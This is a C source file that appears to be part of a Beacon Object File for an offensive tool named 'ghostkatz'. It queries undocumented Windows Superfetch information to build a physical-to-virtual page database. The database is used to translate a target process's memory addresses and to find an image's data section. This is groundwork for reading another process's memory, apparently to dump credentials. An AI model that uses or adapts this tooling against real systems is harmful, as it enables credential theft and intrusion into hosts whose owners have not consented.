#include <windows.h>
#include <stdint.h>

#include "superfetch.h"
#include "ghostkatz.h"

BOOL QuerySuperfetchMemoryRanges(SUPERFETCH_INFORMATION* superfetchInfo, BOOL use_PF_MEMORYRANGEINFO_V2, PVOID* ppInfo, PULONG pInfoLen)
{
    *ppInfo = NULL;
    *pInfoLen = 0;

    ULONG returnLength = 0;
    NTSTATUS status = 0;

    //
    // --- Step 1: probe memory ranges ---
    //
    if (use_PF_MEMORYRANGEINFO_V2)
    {
        PF_MEMORY_RANGE_INFO_V2 probe = { 0 };
        probe.version = 2; // Windows 1803+

        superfetchInfo->Data = &probe;
        superfetchInfo->Length = sizeof(probe);

        status = NtQuerySystemInformation(SystemSuperfetchInformation, superfetchInfo, sizeof(*superfetchInfo), &returnLength);
    }
    else
    {
        PF_MEMORY_RANGE_INFO_V1 probe = { 0 };
        probe.Version = 1; 

        superfetchInfo->Data = &probe;
        superfetchInfo->Length = sizeof(probe);

        status = NtQuerySystemInformation(SystemSuperfetchInformation, superfetchInfo, sizeof(*superfetchInfo), &returnLength);
    }

    // Expect probe to fail with required size
    if (status != STATUS_BUFFER_TOO_SMALL && returnLength == 0)
    {
        BeaconFormatPrintf(&outputbuffer,
            "[!] NtQuerySystemInformation (SuperfetchMemoryRangesQuery) probe failed: 0x%lx (retLen=%lu)\n",
            status, returnLength);
        return FALSE;
    }

    //
    // --- Step 2: allocate proper amount of buffer for ranges ---
    //
    PVOID info = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, returnLength);
    if (!info)
    {
        BeaconFormatPrintf(&outputbuffer, "[!] HeapAlloc failed allocating %lu bytes for ranges\n", returnLength);
        return FALSE;
    }

    if (use_PF_MEMORYRANGEINFO_V2)
        ((PPF_MEMORY_RANGE_INFO_V2)info)->version = 2;
    else
        ((PPF_MEMORY_RANGE_INFO_V1)info)->Version = 1;

    //
    // --- Step 3: Call the function for real ---
    //
    superfetchInfo->Data = info;
    superfetchInfo->Length = returnLength;

    status = NtQuerySystemInformation(SystemSuperfetchInformation, superfetchInfo, sizeof(*superfetchInfo), &returnLength);

    if (status != 0)
    {
        BeaconFormatPrintf(&outputbuffer, "[!] NtQuerySystemInformation (SuperfetchMemoryRangesQuery) failed: 0x%lx\n", status);
        HeapFree(GetProcessHeap(), 0, info);
        return FALSE;
    }

    *ppInfo = info;
    *pInfoLen = returnLength;
    return TRUE;
}

BOOL BuildGlobalDatabase(SUPERFETCH_INFORMATION* superfetchInfo, BOOL use_PF_MEMORYRANGEINFO_V2, PVOID pInfo, PTRANSLATION_INFORMATION* pGlobalTranslationInfo)
{
    if (!superfetchInfo || !pInfo || !pGlobalTranslationInfo || !*pGlobalTranslationInfo)
        return FALSE;

    // Normalize "ranges pointer" + "range count" across V1/V2
    PF_PHYSICAL_MEMORY_RANGE* pRanges = NULL;
    ULONG rangeCount = 0;

    if (use_PF_MEMORYRANGEINFO_V2)
    {
        PPF_MEMORY_RANGE_INFO_V2 info2 = (PPF_MEMORY_RANGE_INFO_V2)pInfo;
        rangeCount = info2->ranges_count;
        pRanges = info2->ranges;
    }
    else
    {
        PPF_MEMORY_RANGE_INFO_V1 info1 = (PPF_MEMORY_RANGE_INFO_V1)pInfo;
        rangeCount = info1->RangeCount;
        pRanges = info1->Ranges;
    }

    size_t bufferBase = 0;

    for (ULONG i = 0; i < rangeCount; i++)
    {
        PF_PHYSICAL_MEMORY_RANGE* range = &pRanges[i];
        ULONG_PTR basePfn = range->BasePfn;
        size_t pageCount = range->PageCount;

        size_t PfnDataSize =
            FIELD_OFFSET(PF_PFN_PRIO_REQUEST, PageData) +
            pageCount * sizeof(MMPFN_IDENTITY);

        PF_PFN_PRIO_REQUEST* PfPfnPrioRequestData =
            (PF_PFN_PRIO_REQUEST*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PfnDataSize);

        if (!PfPfnPrioRequestData)
        {
            BeaconFormatPrintf(&outputbuffer, "[!] HeapAlloc failed for PFN request (range %lu)\n", i);
            return FALSE;
        }

        PfPfnPrioRequestData->Version = 1;
        PfPfnPrioRequestData->RequestFlags = 1;
        PfPfnPrioRequestData->PfnCount = pageCount;

        for (ULONG_PTR j = 0; j < pageCount; j++)
            PfPfnPrioRequestData->PageData[j].PageFrameIndex = basePfn + j;

        superfetchInfo->Data = PfPfnPrioRequestData;
        superfetchInfo->Length = (ULONG)PfnDataSize;
        superfetchInfo->InfoClass = SuperfetchPfnQuery;

        ULONG ResultLength = 0;
        NTSTATUS status = NtQuerySystemInformation(SystemSuperfetchInformation, superfetchInfo, sizeof(*superfetchInfo), &ResultLength);

        if (status != 0)
        {
            BeaconFormatPrintf(&outputbuffer, "[!] NtQuerySystemInformation SuperfetchPfnQuery failed! Error: 0x%lx\n", status);
            HeapFree(GetProcessHeap(), 0, PfPfnPrioRequestData);
            return FALSE;
        }

        PVOID pPerRangeTranslationInfoBuffer =
            HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pageCount * sizeof(TRANSLATION_INFORMATION));

        if (!pPerRangeTranslationInfoBuffer)
        {
            BeaconFormatPrintf(&outputbuffer, "[!] HeapAlloc failed for translation buffer (range %lu)\n", i);
            HeapFree(GetProcessHeap(), 0, PfPfnPrioRequestData);
            return FALSE;
        }

        PTRANSLATION_INFORMATION pTranslationInfo = (PTRANSLATION_INFORMATION)pPerRangeTranslationInfoBuffer;

        for (size_t k = 0; k < pageCount; k++)
        {
            MMPFN_IDENTITY pfnIdentity = PfPfnPrioRequestData->PageData[k];
            pTranslationInfo[k].PageFrameIndex = pfnIdentity.PageFrameIndex;
            pTranslationInfo[k].PagePhysicalAddress = (pfnIdentity.PageFrameIndex << PAGE_SHIFT);
            pTranslationInfo[k].PageVirtualAddress = (DWORD64)pfnIdentity.u2.VirtualAddress;
            pTranslationInfo[k].UniqueProcessKey = pfnIdentity.u1.e4.UniqueProcessKey;
        }

        memcpy((PBYTE)*pGlobalTranslationInfo + bufferBase, pTranslationInfo, pageCount * sizeof(TRANSLATION_INFORMATION));

        bufferBase += pageCount * sizeof(TRANSLATION_INFORMATION);

        HeapFree(GetProcessHeap(), 0, pPerRangeTranslationInfoBuffer);
        HeapFree(GetProcessHeap(), 0, PfPfnPrioRequestData);
    }

    HeapFree(GetProcessHeap(), 0, pInfo);
    return TRUE;
}

PTRANSLATION_INFORMATION pGlobalTranslationInfo;
size_t TotalRangePageCount = 0;

BOOL CreateGlobalSuperfetchDatabase(BOOL use_PF_MEMORYRANGEINFO_V2)
{
    BeaconFormatPrintf(&outputbuffer, "[+] Creating Global Pfn Database...\n");

    // Step 1 - Query Superfetch for physical memory ranges (V1 or V2)
    PVOID pInfo = NULL;
    ULONG infoLen = 0;

    SUPERFETCH_INFORMATION superfetchInfo = {
        .Version   = SUPERFETCH_VERSION,     // must be 45 (0x2D)
        .Magic     = SUPERFETCH_MAGIC,       // 'kuhC'
        .InfoClass = SuperfetchMemoryRangesQuery
    };

    BOOL bResult = QuerySuperfetchMemoryRanges(
        &superfetchInfo,
        use_PF_MEMORYRANGEINFO_V2,
        &pInfo,
        &infoLen
    );

    if (!bResult || !pInfo)
        return FALSE;

    //
    // Step 2 - Compute total number of pages across all ranges
    //
    TotalRangePageCount = 0;

    if (use_PF_MEMORYRANGEINFO_V2)
    {
        PPF_MEMORY_RANGE_INFO_V2 info2 = (PPF_MEMORY_RANGE_INFO_V2)pInfo;

        for (ULONG i = 0; i < info2->ranges_count; i++)
        {
            TotalRangePageCount += info2->ranges[i].PageCount;
        }
    }
    else
    {
        PPF_MEMORY_RANGE_INFO_V1 info1 = (PPF_MEMORY_RANGE_INFO_V1)pInfo;

        for (ULONG i = 0; i < info1->RangeCount; i++)
        {
            TotalRangePageCount += info1->Ranges[i].PageCount;
        }
    }

    if (TotalRangePageCount == 0)
    {
        BeaconFormatPrintf(&outputbuffer, "[!] TotalRangePageCount == 0\n");
        HeapFree(GetProcessHeap(), 0, pInfo);
        return FALSE;
    }

    //
    // Step 3 - Allocate global translation database buffer
    //
    SIZE_T globalSize = TotalRangePageCount * sizeof(TRANSLATION_INFORMATION);

    PVOID pGlobalTranslationInformationBuffer =
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, globalSize);

    if (!pGlobalTranslationInformationBuffer)
    {
        BeaconFormatPrintf(&outputbuffer, "[!] Failed to allocate global translation buffer (%llu bytes)\n", (unsigned long long)globalSize);

        HeapFree(GetProcessHeap(), 0, pInfo);
        return FALSE;
    }

    //
    // Step 4 - Build global PFN → VA database
    //
    BeaconFormatPrintf(&outputbuffer, "[+] Building database...\n");

    pGlobalTranslationInfo =
        (PTRANSLATION_INFORMATION)pGlobalTranslationInformationBuffer;

    bResult = BuildGlobalDatabase(
        &superfetchInfo,
        use_PF_MEMORYRANGEINFO_V2,
        pInfo,
        &pGlobalTranslationInfo
    );

    if (!bResult)
    {
        // Cleanup
        if (pInfo)
            HeapFree(GetProcessHeap(), 0, pInfo);

        HeapFree(GetProcessHeap(), 0, pGlobalTranslationInformationBuffer);
        pGlobalTranslationInfo = NULL;
        TotalRangePageCount = 0;
        return FALSE;
    }

    BeaconFormatPrintf(&outputbuffer, "[+] Finished building database!\n");
    return TRUE;
}


BOOL TranslateV2P(DWORD64 VirtualAddress, DWORD64* PhysicalAddress)
{
    
    for (size_t i = 0; i < TotalRangePageCount; i++)
    {
        if ((VirtualAddress & ~0xFFF) == (DWORD64)pGlobalTranslationInfo[i].PageVirtualAddress)
        {
            DWORD64 PageVA = pGlobalTranslationInfo[i].PageVirtualAddress;
            DWORD64 PagePA = pGlobalTranslationInfo[i].PagePhysicalAddress;

            *PhysicalAddress = PagePA + (VirtualAddress - (DWORD64)PageVA);

            return TRUE;
        }
    }

    return FALSE;
}

BOOL TranslateP2V(DWORD64 PhysicalAddress, DWORD64* VirtualAddress)
{
    for (size_t i = 0; i < TotalRangePageCount; i++)
    {
        if ((PhysicalAddress & ~0xFFF) == (DWORD64)pGlobalTranslationInfo[i].PagePhysicalAddress)
        {
            DWORD64 PageVA = pGlobalTranslationInfo[i].PageVirtualAddress;
            DWORD64 PagePA = pGlobalTranslationInfo[i].PagePhysicalAddress;

            *VirtualAddress = PageVA + (PhysicalAddress - (DWORD64)PagePA);

            return TRUE;
        }
    }

    return FALSE;
}

// The TargetUniqueProcessKey is the lower32bits of the EPROCESS address
BOOL TranslateUVA2Physical(DWORD64 VirtualAddress, DWORD64* PhysicalAddress, DWORD TargetUniqueProcessKey, DWORD TargetPID)
{
    if (TargetUniqueProcessKey == 0 || TargetPID == 0)
    {
        BeaconFormatPrintf(&outputbuffer, "Did not pass in target UniqueProcessKey or PID!\n");
        return FALSE;
    }

    // Loop through all structs in global database
    for (size_t i = 0; i < TotalRangePageCount; i++)
    {
        // Check if the target process UPK matches with the page UPK. UPK can be represented as either lower 32 bits of _EPROCESS, or PID.
        if (pGlobalTranslationInfo[i].UniqueProcessKey == TargetUniqueProcessKey || pGlobalTranslationInfo[i].UniqueProcessKey == TargetPID)
        {
            // If UPK's match then process is found; check if the target address to translate resides in page
            if ((VirtualAddress & ~0xFFF) == (DWORD64)pGlobalTranslationInfo[i].PageVirtualAddress)
            {
                DWORD64 PageVA = pGlobalTranslationInfo[i].PageVirtualAddress;
                DWORD64 PagePA = pGlobalTranslationInfo[i].PagePhysicalAddress;

                // Add offset from page to get address
                *PhysicalAddress = PagePA + (VirtualAddress - (DWORD64)PageVA);

                return TRUE;
            }
        }
    }

    return FALSE;
}

DWORD64 GetDataSectionBase(DWORD64 ImageStartAddress, DWORD64 ImageEndAddress, DWORD TargetUniqueProcessKey, DWORD TargetPID)
{
    DWORD64 LowestAddressInImageRange = ImageEndAddress;

    // Loop through all structs in global database
    for (size_t i = 0; i < TotalRangePageCount; i++)
    {
        // Check if the target process UPK matches with the page UPK. UPK can be represented as either lower 32 bits of _EPROCESS, or PID.
        if (pGlobalTranslationInfo[i].UniqueProcessKey == TargetUniqueProcessKey || pGlobalTranslationInfo[i].UniqueProcessKey == TargetPID)
        {
            DWORD64 PageVA = pGlobalTranslationInfo[i].PageVirtualAddress;
            if (PageVA > ImageStartAddress && PageVA < ImageEndAddress)
            {
                if (PageVA < LowestAddressInImageRange)
                {
                    LowestAddressInImageRange = PageVA;
                }
            }
        }
    }

    return LowestAddressInImageRange;
}